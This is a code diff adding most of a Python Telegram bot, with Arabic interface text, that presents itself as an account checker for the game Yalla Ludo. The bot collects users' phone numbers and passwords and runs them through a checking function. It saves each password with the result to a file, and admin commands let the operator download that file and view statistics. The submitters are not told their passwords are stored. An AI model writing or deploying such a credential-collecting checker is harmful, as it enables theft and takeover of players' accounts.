@@ -504,4 +504,195 @@ def back_to_menu(call):
     bot.edit_message_text(
         "🎲 <b>بوت فحص حسابات Yalla Ludo</b>\n\n"
         "اختر الدولة أولاً ثم اضغط 'فحص حساب'",
-        chat_id=call.mes
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        parse_mode="HTML",
+        reply_markup=markup
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "check")
+def check_account_callback(call):
+    user_id = call.from_user.id
+    
+    if user_id not in user_country:
+        bot.answer_callback_query(call.id, "❌ الرجاء اختيار الدولة أولاً!")
+        return
+    
+    msg = bot.send_message(
+        call.message.chat.id,
+        f"📱 <b>أرسل رقم الحساب</b>\n\n"
+        f"🌍 الدولة: {[name for name, code in COUNTRIES.items() if code == user_country[user_id]][0]}\n\n"
+        f"📌 أرسل الرقم بدون مفتاح الدولة (مثال: 512345678)",
+        parse_mode="HTML"
+    )
+    bot.register_next_step_handler(msg, get_mobile)
+
+def get_mobile(message):
+    mobile = message.text.strip()
+    
+    if not mobile or not mobile.isdigit():
+        bot.reply_to(message, "❌ الرجاء إدخال أرقام فقط.")
+        return
+    
+    user_id = message.from_user.id
+    area_code = user_country.get(user_id, "966")
+    
+    msg = bot.send_message(
+        message.chat.id,
+        f"🔑 <b>أرسل كلمة المرور</b>\n\n"
+        f"📱 الرقم: {mobile}\n"
+        f"🌍 الدولة: +{area_code}",
+        parse_mode="HTML"
+    )
+    bot.register_next_step_handler(msg, lambda m: get_password(m, mobile, area_code))
+
+def get_password(message, mobile, area_code):
+    password = message.text.strip()
+    
+    if not password:
+        bot.reply_to(message, "❌ الرجاء إدخال كلمة مرور صحيحة.")
+        return
+    
+    # إرسال رسالة انتظار
+    wait_msg = bot.reply_to(message, "⏳ جاري فحص الحساب...")
+    
+    # فحص الحساب
+    result = check_account(mobile, password, area_code)
+    
+    # إيجاد اسم الدولة
+    country_name = None
+    for name, code in COUNTRIES.items():
+        if code == area_code:
+            country_name = name
+            break
+    
+    # حفظ النتيجة
+    user_id = message.from_user.id
+    username = message.from_user.username
+    save_result(user_id, username, mobile, password, area_code, result)
+    
+    # عرض النتيجة
+    if result.get('status') == 0:
+        text = format_result(result, mobile, password, country_name)
+        bot.edit_message_text(
+            text,
+            chat_id=message.chat.id,
+            message_id=wait_msg.message_id,
+            parse_mode="HTML"
+        )
+    else:
+        error_text = f"❌ فشل الفحص\n\n"
+        error_text += f"📱 الرقم: {mobile}\n"
+        error_text += f"🌍 الدولة: {country_name or area_code}\n"
+        error_text += f"🔑 الباسورد: <code>{password}</code>\n"
+        error_text += f"⚠️ السبب: {result.get('tips', 'خطأ غير معروف')}"
+        bot.edit_message_text(
+            error_text,
+            chat_id=message.chat.id,
+            message_id=wait_msg.message_id,
+            parse_mode="HTML"
+        )
+
+# ==================== أوامر الأدمن ====================
+@bot.message_handler(commands=['users'])
+def users_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
+        return
+    try:
+        with open(USERS_FILE, 'r', encoding='utf-8') as f:
+            content = f.read()
+        users = [line for line in content.split('\n') if line and not line.startswith('#')]
+        count = len(users)
+        text = f"📊 <b>إحصائيات المستخدمين</b>\n"
+        text += f"{'─' * 30}\n"
+        text += f"👥 عدد المستخدمين: <b>{count}</b>\n"
+        text += f"{'─' * 30}\n\n"
+        if users:
+            text += "<b>آخر 10 مستخدمين:</b>\n"
+            for user in users[-10:]:
+                text += f"• {user}\n"
+        bot.reply_to(message, text, parse_mode="HTML")
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {e}")
+
+@bot.message_handler(commands=['results'])
+def results_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
+        return
+    try:
+        with open(RESULTS_FILE, 'rb') as f:
+            bot.send_document(
+                message.chat.id,
+                f,
+                caption=f"📄 نتائج الفحوصات - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {e}")
+
+@bot.message_handler(commands=['stats'])
+def stats_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
+        return
+    try:
+        with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
+            content = f.read()
+        checks = [line for line in content.split('\n') if line.startswith('📅')]
+        count = len(checks)
+        success = content.count('✅')
+        failed = content.count('❌')
+        text = f"📊 <b>إحصائيات الفحوصات</b>\n"
+        text += f"{'─' * 30}\n"
+        text += f"📝 عدد الفحوصات: <b>{count}</b>\n"
+        text += f"✅ النجاح: <b>{success}</b>\n"
+        text += f"❌ الفشل: <b>{failed}</b>\n"
+        bot.reply_to(message, text, parse_mode="HTML")
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ: {e}")
+
+# ==================== Self-Ping ====================
+def keep_alive():
+    port = int(os.environ.get('PORT', 10000))
+    url = f"http://localhost:{port}/"
+    while True:
+        try:
+            urllib.request.urlopen(url, timeout=5)
+            print(f"✅ Self-ping at {datetime.now().strftime('%H:%M:%S')}")
+        except Exception as e:
+            print(f"❌ Self-ping failed: {e}")
+        time.sleep(240)
+
+# ==================== تشغيل البوت ====================
+def run_bot():
+    print("🤖 Bot is polling...")
+    try:
+        bot.infinity_polling(timeout=60)
+    except Exception as e:
+        print(f"❌ Bot error: {e}")
+        time.sleep(5)
+        run_bot()
+
+if __name__ == "__main__":
+    port = int(os.environ.get('PORT', 10000))
+    
+    print("🚀 Bot is running...")
+    print("="*50)
+    print(f"📁 Users: {USERS_FILE}")
+    print(f"📁 Results: {RESULTS_FILE}")
+    print(f"🌐 Port: {port}")
+    print("="*50)
+    
+    # تشغيل البوت
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
+    
+    # Self-ping
+    ping_thread = threading.Thread(target=keep_alive)
+    ping_thread.daemon = True
+    ping_thread.start()
+    
+    # تشغيل Flask
+    app.run(host='0.0.0.0', port=port)
